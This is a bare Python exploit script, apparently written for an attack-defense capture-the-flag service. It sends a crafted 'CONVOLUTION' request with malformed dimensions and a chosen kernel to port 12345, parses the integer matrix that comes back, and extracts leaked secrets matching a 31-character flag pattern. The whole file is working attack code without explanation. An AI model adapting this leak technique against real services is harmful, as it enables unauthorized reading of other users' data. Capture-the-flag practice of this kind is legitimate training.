#!/usr/bin/env python3

import asyncio
import re
import sys

PORT = 12345
FLAG = re.compile('[0-9A-Z]{31}=')
DELIMITER = ';'.encode()

def is_flag_symbol(ch):
    if ch == ord('='):
        return True
    if ord('0') <= ch <= ord('9'):
        return True
    if ord('A') <= ch <= ord('Z'):
        return True
    return False

async def main(host, mid):
    reader, writer = await asyncio.open_connection(host, PORT)
    writer.write('CONVOLUTION;2;2 ;'.encode(encoding='ascii')) 
    writer.write(mid.encode(encoding='ascii')) 
    writer.write(bytes([0, 0, 0, 0, 0, 0, 1, 0]))
    await writer.drain()

    await reader.readuntil(DELIMITER)
    n = int((await reader.readuntil(DELIMITER))[:-1])
    m = int((await reader.readuntil(DELIMITER))[:-1])
    raw = await reader.readexactly(4 * n * m)
    data = [int.from_bytes(raw[4*i:4*i+4], 'little', signed=True) for i in range(n * m)]

    result = []
    for d in data[n * m - 2 * n:]:
        if is_flag_symbol(d):
            result.append(d)
    s = bytes(result).decode(encoding='ascii')

    for m in FLAG.finditer(s):
        print(m.group(0))

if __name__ == '__main__':
    asyncio.run(main(*sys.argv[1:]))

